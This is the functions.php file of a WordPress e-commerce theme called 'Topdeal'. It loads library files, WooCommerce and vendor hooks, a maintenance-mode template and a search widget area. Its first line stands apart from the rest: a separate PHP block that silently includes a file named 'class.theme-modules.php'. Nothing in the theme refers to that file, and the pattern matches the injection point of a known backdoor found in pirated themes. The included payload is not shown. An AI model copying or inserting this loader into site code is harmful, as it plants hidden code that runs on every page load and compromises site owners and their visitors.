<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php 

if ( !defined( 'ICL_LANGUAGE_CODE' ) && !defined('TOPDEAL_THEME') ){
	define( 'TOPDEAL_THEME', 'topdeal_theme' );
}else{
	define( 'TOPDEAL_THEME', 'topdeal_theme'.ICL_LANGUAGE_CODE );
}

/**
 * Variables
 */
require_once ( get_template_directory().'/lib/plugin-requirement.php' );			// Custom functions
require_once ( get_template_directory().'/lib/defines.php' );
require_once ( get_template_directory().'/lib/mobile-layout.php' );
require_once ( get_template_directory().'/lib/classes.php' );		// Utility functions
require_once ( get_template_directory().'/lib/utils.php' );			// Utility functions
require_once ( get_template_directory().'/lib/init.php' );			// Initial theme setup and constants
require_once ( get_template_directory().'/lib/cleanup.php' );		// Cleanup
require_once ( get_template_directory().'/lib/nav.php' );			// Custom nav modifications
require_once ( get_template_directory().'/lib/widgets.php' );		// Sidebars and widgets
require_once ( get_template_directory().'/lib/scripts.php' );		// Scripts and stylesheets
require_once ( get_template_directory().'/lib/metabox.php' );	// Custom functions
require_once ( get_template_directory().'/lib/import/sw-import.php' );
require_once ( get_template_directory().'/custom-function.php' );
if( class_exists( 'WooCommerce' ) ){
	require_once ( get_template_directory().'/lib/plugins/currency-converter/currency-converter.php' ); // currency converter
	require_once ( get_template_directory().'/lib/woocommerce-hook.php' );	// Utility functions
	
	if( class_exists( 'WC_Vendors' ) ) :
		require_once ( get_template_directory().'/lib/wc-vendor-hook.php' );			/** WC Vendor **/
	endif;
	
	if( class_exists( 'WeDevs_Dokan' ) ) :
		require_once ( get_template_directory().'/lib/dokan-vendor-hook.php' );			/** Dokan Vendor **/
	endif;
}

function topdeal_template_load( $template ){ 
	if( !is_user_logged_in() && topdeal_options()->getCpanelValue('maintaince_enable') ){
		$template = get_template_part( 'maintaince' );
	}else{
		if( class_exists( 'WooCommerce' ) ){
			if ( is_tax( 'product_cat' ) || is_post_type_archive( 'product' ) ) {				
				$template = get_template_part( 'archive', 'product' );
			}			
		}
	}
	return $template;
}
add_filter( 'template_include', 'topdeal_template_load' );

add_filter( 'topdeal_widget_register', 'topdeal_add_custom_widgets' );
function topdeal_add_custom_widgets( $topdeal_widget_areas ){
	if( class_exists( 'sw_woo_search_widget' ) ){
		$topdeal_widget_areas[] = array(
			'name' => esc_html__('Widget Search', 'topdeal'),
			'id'   => 'search',
			'before_widget' => '<div class="widget %1$s %2$s"><div class="widget-inner">',
			'after_widget'  => '</div></div>',
			'before_title'  => '<h3>',
			'after_title'   => '</h3>'
		);
	}
	return $topdeal_widget_areas;
}